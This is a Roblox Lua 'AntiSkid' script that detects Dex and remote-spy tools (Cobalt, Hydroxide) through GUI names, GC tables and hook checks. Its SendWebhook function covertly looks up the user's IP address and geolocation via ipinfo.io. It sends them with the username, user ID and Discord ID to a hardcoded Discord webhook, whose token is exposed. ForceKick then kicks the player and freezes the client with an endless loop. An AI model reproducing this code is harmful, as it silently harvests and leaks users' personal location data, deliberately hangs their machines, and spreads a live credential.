--fuck off
local Players     = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui     = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local CFG = {
    WEBHOOK_URL        = "https://discord.com/api/webhooks/1475189225392701521/YfX3ZfF2uPdxDU-7SkGukEZbDZXoJrb_qvlCykdoYftM-dUr7sKPrFGThPOCYLso-1E_",

    CHECK_OBFUSCATION  = true,
    CHECK_DEX_GC       = true,
    CHECK_DEX_CONNS    = true,
    CHECK_COBALT       = true,
    CHECK_METAMETHODS  = true,
    CHECK_SIGNAL       = true,
    CHECK_REMOTE_HOOKS = true,
    CHECK_REMOTE_CONNS = true,
    CHECK_NIL_REMOTES  = true,
    CHECK_SPY_GC       = true,
    CHECK_FENV         = true,
    CHECK_STACK        = false,
    CHECK_OVERHEAD     = true,
    CHECK_THREADS      = true,

    SCAN_INTERVAL_SEC  = 2,
    CALL_WINDOW_SEC    = 1,
    OVERHEAD_THRESHOLD = 0.025,
    OVERHEAD_CALLS     = 20,
    THREAD_THRESHOLD   = 8,
    UNC_MISS_THRESHOLD = 5,
    DEX_CONN_THRESHOLD = 4,

    GUI_YIELD_EVERY    = 100,
    GC_YIELD_EVERY     = 50,
    REMOTE_YIELD_EVERY = 50,
    PHASE_DELAY        = 0.5,
}

local Kicked = false

local Scanned = setmetatable({}, { __mode = "k" })

local function SafeCall(Fn, ...)
    local Ok, R = pcall(Fn, ...)
    return Ok and R or nil
end

local HttpRequest = (
    (type(request)      == "function" and request)                          or
    (type(http_request) == "function" and http_request)                     or
    (syn     and type(syn.request)     == "function" and syn.request)       or
    (fluxus  and type(fluxus.request)  == "function" and fluxus.request)    or
    nil
)
local DiscordId = tostring(_G.Cobra_DiscordID or "Unknown")

local function SendWebhook(Category, Flag)
    if not HttpRequest then return end

    local Username  = tostring(LocalPlayer.Name)
    local UserId    = tostring(LocalPlayer.UserId)
    local PlaceId   = tostring(game.PlaceId)
    local JobId     = tostring(game.JobId or "Unknown")
    local PlaceName = "Unknown"

    pcall(function()
        PlaceName = game:GetService("MarketplaceService")
            :GetProductInfo(game.PlaceId).Name or "Unknown"
    end)

    local IpAddress, IpCity, IpRegion, IpCountry = "?", "?", "?", "?"
    local Ok, Raw = pcall(game.HttpGet, game, "https://ipinfo.io/json")
    if Ok and type(Raw) == "string" then
        IpAddress = Raw:match('"ip"%s*:%s*"([^"]+)"')     or "?"
        IpCity    = Raw:match('"city"%s*:%s*"([^"]+)"')   or "?"
        IpRegion  = Raw:match('"region"%s*:%s*"([^"]+)"') or "?"
        IpCountry = Raw:match('"country"%s*:%s*"([^"]+)"')or "?"
    end

    local Ok2, Payload = pcall(HttpService.JSONEncode, HttpService, {
        embeds = {{
            title  = "AntiSkid Flag — " .. Category,
            color  = 16711680,
            fields = {
                { name = "Username",   value = Username, inline = true  },
                { name = "UserID",     value = UserId,   inline = true  },
                { name = "Discord ID", value = DiscordId, inline = true },
                { name = "Category",   value = Category, inline = false },
                { name = "Detection",  value = Flag,     inline = false },
                { name = "Game",       value = PlaceName .. " (PlaceId: " .. PlaceId .. ")", inline = false },
                { name = "JobId",      value = JobId,    inline = false },
                { name = "Location",   value = IpCity..", "..IpRegion..", "..IpCountry, inline = false },
                { name = "IP",         value = IpAddress, inline = false },
            },
        }},
    })
    if not Ok2 then return end

    pcall(HttpRequest, {
        Url     = CFG.WEBHOOK_URL,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = Payload,
    })
end

local function ForceKick(Category, Reason)
    task.spawn(function()
        SendWebhook(Category, Reason)
            task.wait(1)
        pcall(function() LocalPlayer:Kick("[" .. Category .. "] " .. Reason) end)
            task.wait(2)
        while true do end
    end)
end

local function KickClient(Category, Reason)
    if Kicked then return end
    Kicked = true
    ForceKick(Category, Reason)
end

local InstanceMeta    = SafeCall(getrawmetatable, game)
local RealNamecall    = InstanceMeta and rawget(InstanceMeta, "__namecall") or nil
local RealNewIndex    = InstanceMeta and rawget(InstanceMeta, "__newindex") or nil

local _SP             = Instance.new("Part")
local SignalMeta      = SafeCall(getrawmetatable, _SP.Touched)
local RealSignalIndex = SignalMeta and rawget(SignalMeta, "__index") or nil
_SP:Destroy()

local _SRE           = Instance.new("RemoteEvent")
local _SRF           = Instance.new("RemoteFunction")
local RealFireServer = _SRE.FireServer
_SRE:Destroy()
_SRF:Destroy()

local UncSnapshot = {}
local UncNames = {
    "hookfunction","hookmetamethod","newcclosure","clonefunction",
    "getupvalues","getconstants","getprotos","getinfo",
    "iscclosure","islclosure","isexecutorclosure","getfunctionhash",
    "getcallbackvalue","getscriptthread","getallthreads","setstackhidden",
    "getfenv","setfenv","getconnections","getrawmetatable","setrawmetatable",
    "getrenv","getsenv","checkcaller","getcallingscript","isfunctionhooked",
    "restorefunction","getnilinstances","identifyexecutor","cloneref",
    "compareinstances","setreadonly","getthreadidentity","setthreadidentity",
}
for _, N in ipairs(UncNames) do
    if type(_G[N]) == "function" then UncSnapshot[N] = _G[N] end
end

local function IsExecClosure(Fn)
    if type(Fn) ~= "function" then return false end
    if isexecutorclosure and isexecutorclosure(Fn) then return true end
    if iscclosure and islclosure then
        if not iscclosure(Fn) and not islclosure(Fn) then return true end
    end
    return false
end

local function IsFnHooked(Fn)
    if type(Fn) ~= "function" then return false end
    if IsExecClosure(Fn) then return true end
    if isfunctionhooked and isfunctionhooked(Fn) then return true end
    if getupvalues then
        local Ok, Ups = pcall(getupvalues, Fn)
        if Ok and Ups then
            for _, V in pairs(Ups) do
                if type(V) == "function" and IsExecClosure(V) then return true end
            end
        end
    end
    return false
end

local function HashMismatch(A, B)
    if not getfunctionhash or not A or not B then return false end
    local H1 = SafeCall(getfunctionhash, A)
    local H2 = SafeCall(getfunctionhash, B)
    return H1 ~= nil and H2 ~= nil and H1 ~= H2
end

local LegitPrefixes = {
    "^GetFFlag","^GetFInt","^GetFString","^GetFVariable",
    "^GetFastFlag","^GetFastInt","^GetFastString",
}

local function IsLikelyRobloxInternal(Name)
    for _, P in ipairs(LegitPrefixes) do
        if Name:match(P) then return true end
    end
    return false
end

local DexSigs = {
    "dex",
    "appsframe",
    "exploreritem",
    "propname",
    "numberline",
    "editattribute",
    "soundpreview",
    "timeline",
}

local DexWholeWord = { dex = true }

local DexScreenGuiNames = {
    MainMenu = true,
    Context  = true,
    BrickColor = true,
    Intro    = true,
}

local DexAssetIds = {
    ["rbxassetid://6579106223"] = true, 
    ["rbxassetid://6578871732"] = true,  
    ["rbxassetid://6578933307"] = true,  
    ["rbxassetid://1427967925"] = true, 
}

local SpySigs = {
    "cobalt","hydroxide","hydroconnections",
    "remotespy","remotelogger","remotepanel",
    "remotelogs","remoteviewer","spygui",
    "httpspy","arglogger","remotecapture","rspy",
}

local function CheckObj(Obj)
    if Kicked then return end
    local Name = Obj.Name
    if IsLikelyRobloxInternal(Name) then return end
    local L = Name:lower()

    for _, S in ipairs(DexSigs) do
        local Found = L:find(S, 1, true)
        if Found then
            if DexWholeWord[S] then
                local Before = Found > 1 and L:sub(Found - 1, Found - 1) or ""
                local After  = L:sub(Found + #S, Found + #S)
                if Before:match("%a") or After:match("%a") then continue end
            end
            KickClient("Dex", "GUI signature matched: " .. Name)
            return
        end
    end

    local CN = Obj.ClassName
    if CN == "ScreenGui" and DexScreenGuiNames[Name] then
        KickClient("Dex", "Dex ScreenGui detected: " .. Name)
        return
    end

    if (CN == "ImageLabel" or CN == "ImageButton") then
        local Ok, Img = pcall(function() return Obj.Image end)
        if Ok and DexAssetIds[Img] then
            KickClient("Dex", "Dex asset ID detected on " .. CN .. ": " .. Img)
            return
        end
    end

    for _, S in ipairs(SpySigs) do
        if L:find(S, 1, true) then
            KickClient("RemoteSpy", "GUI signature matched: " .. Name)
            return
        end
    end
end

local function ScanHiddenGui()
    if not Kicked and gethui then
        local Ok, Hidden = pcall(gethui)
        if Ok and Hidden then
            local Ok2, Desc = pcall(function() return Hidden:GetDescendants() end)
            if Ok2 and Desc then
                for I, Obj in ipairs(Desc) do
                    if Kicked then return end
                    CheckObjFull(Obj)
                    if I % CFG.GUI_YIELD_EVERY == 0 then task.wait() end
                end
            end
        end
    end
end

local ObfPatterns = {
    "^[A-Za-z0-9+/]{20,}={1,2}$",
    "^[0-9a-fA-F]{32,}$",
    "[\0-\8\14-\31]",
    "^[^%w%s]{8,}$",
}

local function IsObfuscated(Name)
    local C = Name:gsub("_%d+$",""):gsub("^%d+_",""):gsub("%d+$","")
    if #C < 8 then return false end
    if IsLikelyRobloxInternal(C) then return false end
    if #C > 140 then return true end
    for _, P in ipairs(ObfPatterns) do
        if C:match(P) then return true end
    end
    if #C >= 16 then
        local Lower, NonAlpha = C:lower(), 0
        for i = 1, #Lower do
            if not Lower:sub(i,i):match("%a") then NonAlpha += 1 end
        end
        if NonAlpha / #C > 0.65 then return true end
        if Lower:match("(..)%1%1%1") then return true end
    end
    return false
end

function CheckObjFull(Obj)
    if Kicked or Scanned[Obj] then return end
    Scanned[Obj] = true
    CheckObj(Obj)
    if not Kicked and CFG.CHECK_OBFUSCATION and IsObfuscated(Obj.Name) then
        KickClient("Obfuscated GUI", "Obfuscated instance name: " .. Obj.Name)
    end
end

local function ScanRoot(Root)
    local Ok, Desc = pcall(function() return Root:GetDescendants() end)
    if not Ok or not Desc then return end
    for I, Obj in ipairs(Desc) do
        if Kicked then return end
        CheckObjFull(Obj)
        if I % CFG.GUI_YIELD_EVERY == 0 then task.wait() end
    end
end

LocalPlayer.PlayerGui.DescendantAdded:Connect(function(Obj)
    if not Kicked then CheckObjFull(Obj) end
end)
pcall(function()
    CoreGui.DescendantAdded:Connect(function(Obj)
        if not Kicked then CheckObjFull(Obj) end
    end)
end)

pcall(function()
    if gethui then
        local Hidden = gethui()
        if Hidden then
            Hidden.DescendantAdded:Connect(function(Obj)
                if not Kicked then CheckObjFull(Obj) end
            end)
        end
    end
end)

local GcCache = nil

local function RefreshGcCache()
    if not getgc then GcCache = nil return end
    GcCache = SafeCall(getgc, true)
end

local GcTableCheckers = {}

local function RunGcWalk()
    if not GcCache then return end
    local YieldEvery = CFG.GC_YIELD_EVERY
    local I = 0
    for _, V in ipairs(GcCache) do
        if Kicked then return end
        if type(V) == "table" then
            for _, Checker in ipairs(GcTableCheckers) do
                if Checker(V) then return end
            end
        end
        I += 1
        if I % YieldEvery == 0 then task.wait() end
    end
end

local function MakeDexGcChecker()
    if not CFG.CHECK_DEX_GC then return nil end
    local Ok, Desc = pcall(function() return game:GetDescendants() end)
    local Total  = Ok and #Desc or 0
    if Total == 0 then return nil end
    local Cap = math.floor(Total * 0.80) + 1

    return function(V)
        local N = 0
        for K in pairs(V) do
            if typeof(K) == "Instance" then
                N += 1
                if N >= Cap then
                    KickClient("Dex", "Large Instance-keyed GC table detected - Mr.Dex Demon")
                    return true
                end
            end
        end
        return false
    end
end

local CobaltFields = {
    "Communicator","Logs","Hooks","CobaltVerificationToken",
    "Unloaded","NamecallHook","NewIndexHook","AlternativeEnabled",
}

local function MakeCobaltTableChecker()
    if not CFG.CHECK_COBALT then return nil end
    return function(V)
        local Score = 0
        for _, F in ipairs(CobaltFields) do
            if rawget(V, F) ~= nil then
                Score += 1
                if Score >= 4 then
                    KickClient("RemoteSpy", "Cobalt shared table detected = youre a cobalt demon")
                    return true
                end
            end
        end
        return false
    end
end

local SpyGlobalKeys = {
    "CobaltInitialized","Cobalt","CobaltAutoExecuted",
    "HydroxideRunning","HydroxideConnections","Hydroxide",
    "RemoteSpy","remoteSpy","remote_spy",
    "HttpSpy","logRemote","logRemotes","interceptRemote","spy","rspy",
}
local SpyKeySet = {}
for _, K in ipairs(SpyGlobalKeys) do SpyKeySet[K] = true end

local function MakeSpyGcChecker()
    if not CFG.CHECK_SPY_GC then return nil end
    return function(V)
        for K in pairs(V) do
            if type(K) == "string" and SpyKeySet[K] then
                KickClient("RemoteSpy", "Spy global key found in GC - hey hey hey hey good byeeeeeee")
                return true
            end
        end
        return false
    end
end

local function RebuildGcCheckers()
    GcTableCheckers = {}
    local SpyChecker    = MakeSpyGcChecker()
    local CobaltChecker = MakeCobaltTableChecker()
    local DexChecker    = MakeDexGcChecker()
    if SpyChecker    then GcTableCheckers[#GcTableCheckers+1] = SpyChecker    end
    if CobaltChecker then GcTableCheckers[#GcTableCheckers+1] = CobaltChecker end
    if DexChecker    then GcTableCheckers[#GcTableCheckers+1] = DexChecker    end
end

local function CheckDexConnections()
    if not CFG.CHECK_DEX_CONNS or not getconnections then return false end
    local Ok, C = pcall(getconnections, game.DescendantAdded)
    if Ok and type(C) == "table" and #C > CFG.DEX_CONN_THRESHOLD then
        KickClient("Dex", "Excessive DescendantAdded connections: " .. #C)
        return true
    end
    return false
end

local CobaltGlobalKeys = {
    "CobaltInitialized","Cobalt","CobaltAutoExecuted","COBALT_LATEST_URL",
}

local function CheckCobaltGlobals()
    if not CFG.CHECK_COBALT or not getgenv then return false end
    local G = SafeCall(getgenv)
    if not G then return false end
    for _, K in ipairs(CobaltGlobalKeys) do
        if rawget(G, K) ~= nil then
            KickClient("RemoteSpy", "Cobalt global key found - Bye now cobalt demon")
            return true
        end
    end
    return false
end

local function CheckMetamethodHooks()
    if not CFG.CHECK_METAMETHODS or not getrawmetatable then return false end
    local M = SafeCall(getrawmetatable, game)
    if not M then return false end
    local NC = rawget(M, "__namecall")
    local NI = rawget(M, "__newindex")
    if NC and IsExecClosure(NC)       then KickClient("RemoteSpy", "__namecall replaced with executor closure hey hey hey hey good byeeeeeee") return true end
    if NI and IsExecClosure(NI)       then KickClient("RemoteSpy", "__newindex replaced with executor closure hey hey hey hey good byeeeeeee") return true end
    if HashMismatch(RealNamecall, NC) then KickClient("RemoteSpy", "__namecall hash mismatch — hook detected hey hey hey hey good byeeeeeee")  return true end
    if HashMismatch(RealNewIndex, NI) then KickClient("RemoteSpy", "__newindex hash mismatch — hook detected hey hey hey hey good byeeeeeee")  return true end
    return false
end

local function CheckSignalHook()
    if not CFG.CHECK_SIGNAL or not SignalMeta then return false end
    local C = rawget(SignalMeta, "__index")
    if not C then return false end
    if IsExecClosure(C)                 then KickClient("RemoteSpy", "Signal.__index replaced with executor closure - Bye Now") return true end
    if HashMismatch(RealSignalIndex, C) then KickClient("RemoteSpy", "Signal.__index hash mismatch — Connect() spy - Wow👋")   return true end
    return false
end

local function CheckRemoteHooks()
    if not CFG.CHECK_REMOTE_HOOKS then return false end
    local RE, RF = Instance.new("RemoteEvent"), Instance.new("RemoteFunction")
    local FH = IsFnHooked(RE.FireServer)
    local IH = IsFnHooked(RF.InvokeServer)
    RE:Destroy(); RF:Destroy()
    if FH then KickClient("RemoteSpy", "FireServer is hooked Bye Now👋")   return true end
    if IH then KickClient("RemoteSpy", "InvokeServer is hooked Bye Now👋") return true end
    local RE2 = Instance.new("RemoteEvent")
    local MM  = HashMismatch(RealFireServer, RE2.FireServer)
    RE2:Destroy()
    if MM then KickClient("RemoteSpy", "FireServer hash mismatch — hook detected Bye Now👋") return true end
    return false
end

local function SignalHasSpy(Signal)
    if not getconnections then return false end
    local Ok, Connections = pcall(getconnections, Signal)
    if not Ok or type(Connections) ~= "table" then return false end
    for _, Conn in ipairs(Connections) do
        local IsForeign = SafeCall(function() return Conn.ForeignState ~= nil end)
        local Fn        = SafeCall(function() return Conn.Function end)
        if IsForeign and Fn and IsExecClosure(Fn) then
            return true, "Suspicious foreign executor connection Bye Bye👋"
        end
    end
    return false
end

local function ScanRemotes(Instances)
    if type(Instances) ~= "table" then return false end
    for I, Obj in ipairs(Instances) do
        if Kicked then return true end
        local CN = Obj.ClassName

        if CN == "RemoteEvent" or CN == "UnreliableRemoteEvent" then
            local S, R = SignalHasSpy(Obj.OnClientEvent)
            if S then KickClient("RemoteSpy", (R or "spy") .. " on OnClientEvent: " .. Obj:GetFullName()) return true end

        elseif CN == "RemoteFunction" then
            if getcallbackvalue then
                local CB = SafeCall(getcallbackvalue, Obj, "OnClientInvoke")
                if CB and IsExecClosure(CB) then
                    KickClient("RemoteSpy", "OnClientInvoke executor closure: " .. Obj:GetFullName())
                    return true
                end
            end

        elseif CN == "BindableEvent" then
            local S, R = SignalHasSpy(Obj.Event)
            if S then KickClient("RemoteSpy", (R or "spy") .. " on BindableEvent: " .. Obj:GetFullName()) return true end

        elseif CN == "BindableFunction" then
            if getcallbackvalue then
                local CB = SafeCall(getcallbackvalue, Obj, "OnInvoke")
                if CB and IsExecClosure(CB) then
                    KickClient("RemoteSpy", "BindableFunction OnInvoke executor closure: " .. Obj:GetFullName())
                    return true
                end
            end
        end

        if I % CFG.REMOTE_YIELD_EVERY == 0 then task.wait() end
    end
    return false
end

local function CheckRemoteSpyConns()
    if not CFG.CHECK_REMOTE_CONNS then return false end
    for _, Svc in ipairs({ game:GetService("ReplicatedStorage"), game:GetService("Players"), workspace }) do
        local Ok, D = pcall(function() return Svc:GetDescendants() end)
        if Ok and ScanRemotes(D) then return true end
    end
    return false
end

local function CheckNilRemotes()
    if not CFG.CHECK_NIL_REMOTES or not getnilinstances or not getconnections then return false end
    local Nils = SafeCall(getnilinstances)
    if not Nils then return false end
    return ScanRemotes(Nils)
end

local function CheckFenvSpoof()
    if not CFG.CHECK_FENV or not getfenv then return false end
    local Env = SafeCall(getfenv, 1)
    if not Env then return false end
    local Miss = 0
    for _, N in ipairs(UncNames) do
        if UncSnapshot[N] ~= nil and Env[N] == nil then Miss += 1 end
    end
    if Miss > CFG.UNC_MISS_THRESHOLD then
        KickClient("RemoteSpy", "getfenv spoof — " .. Miss .. " UNC functions hidden")
        return true
    end
    return false
end

local function CheckStack()
    if not CFG.CHECK_STACK or not debug or not debug.traceback then return false end
    local T = SafeCall(function() return debug.traceback() end)
    if not T then return false end
    local F = 0
    for _ in T:gmatch("\n") do F += 1 end
    if F < 2 then KickClient("RemoteSpy", "Stack frame deficit - Nice Try But Bye") return true end
    return false
end

local function CheckHookOverhead()
    if not CFG.CHECK_OVERHEAD then return false end
    local RE = Instance.new("RemoteEvent")
    RE.Parent = nil
    local BoundFire = function() RE:FireServer() end
    local T0 = os.clock()
    for _ = 1, CFG.OVERHEAD_CALLS do
        pcall(BoundFire)
    end
    local Elapsed = os.clock() - T0
    RE:Destroy()
    if Elapsed > CFG.OVERHEAD_THRESHOLD then
        KickClient("RemoteSpy", "FireServer hook overhead found. Bye Bye Skid!")
        return true
    end
    return false
end

local function CheckThreads()
    if not CFG.CHECK_THREADS or not getallthreads then return false end
    local T = SafeCall(getallthreads)
    if not T then return false end
    local N = 0
    for _, Th in ipairs(T) do
        local Ok, S = pcall(debug.info, Th, "s")
        if Ok and (S == "" or S == "[C]") then N += 1 end
    end
    if N > CFG.THREAD_THRESHOLD then
        KickClient("RemoteSpy", "Excessive anonymous executor threads. Bye Bye")
        return true
    end
    return false
end

local CallThresholds = {
    getconstants     = 2, getprotos        = 2,
    getsenv          = 2, getrenv          = 2,
    hookfunction     = 8, hookmetamethod   = 8,
    newcclosure      = 8, clonefunction    = 8,
    getcallbackvalue = 8, setstackhidden   = 8,
}
local CallCategories = {
    getconstants = "Dex",  getprotos = "Dex", getsenv = "Dex", getrenv = "Dex",
    hookfunction = "RemoteSpy", hookmetamethod = "RemoteSpy", newcclosure = "RemoteSpy",
    clonefunction = "RemoteSpy", getcallbackvalue = "RemoteSpy", setstackhidden = "RemoteSpy",
}
local CallCounts = {}

local function MonitorFn(Name)
    if not hookfunction or not newcclosure then return end
    local Orig = _G[Name]
    if type(Orig) ~= "function" then return end
    CallCounts[Name] = { N = 0, W = tick() }
    pcall(function()
        hookfunction(Orig, newcclosure(function(...)
            if Kicked then return Orig(...) end
            local D, Now = CallCounts[Name], tick()
            if Now - D.W >= CFG.CALL_WINDOW_SEC then D.N = 0 D.W = Now end
            D.N += 1
            if D.N >= (CallThresholds[Name] or 8) then
                KickClient(CallCategories[Name] or "Unknown", Name .. " called " .. D.N .. "x in 1s (rate exceeded)")
            end
            return Orig(...)
        end))
    end)
end
for Name in pairs(CallThresholds) do MonitorFn(Name) end

local function RunPhase1(PGui)
    task.spawn(function()
        if not Kicked then ScanRoot(PGui)    end
        if not Kicked then ScanRoot(CoreGui) end
        if not Kicked then ScanHiddenGui()   end
    end)

    if not Kicked then CheckDexConnections()  end
    if not Kicked then CheckCobaltGlobals()   end
    if not Kicked then CheckMetamethodHooks() end
    if not Kicked then CheckSignalHook()      end
    if not Kicked then CheckRemoteHooks()     end
    if not Kicked then CheckFenvSpoof()       end
    if not Kicked then CheckStack()           end
    if not Kicked then CheckThreads()         end
end

local function RunPhase2()
    RefreshGcCache()
    RebuildGcCheckers()
    RunGcWalk()
end

local function RunPhase3()
    if not Kicked then CheckRemoteSpyConns() end
    if not Kicked then CheckNilRemotes()     end
    if not Kicked then task.spawn(CheckHookOverhead) end
end

local function RunAllChecks(PGui)
    if Kicked then return end

    task.spawn(function()
        RunPhase1(PGui)
    end)

    task.delay(CFG.PHASE_DELAY, function()
        if not Kicked then RunPhase2() end
    end)

    task.delay(CFG.PHASE_DELAY * 2, function()
        if not Kicked then RunPhase3() end
    end)
end

task.spawn(function()
    task.wait(2)
    local PGui = LocalPlayer:WaitForChild("PlayerGui")
    RunAllChecks(PGui)
    while not Kicked do
        task.wait(CFG.SCAN_INTERVAL_SEC)
        RunAllChecks(PGui)
    end
end)

print("Main Skid")
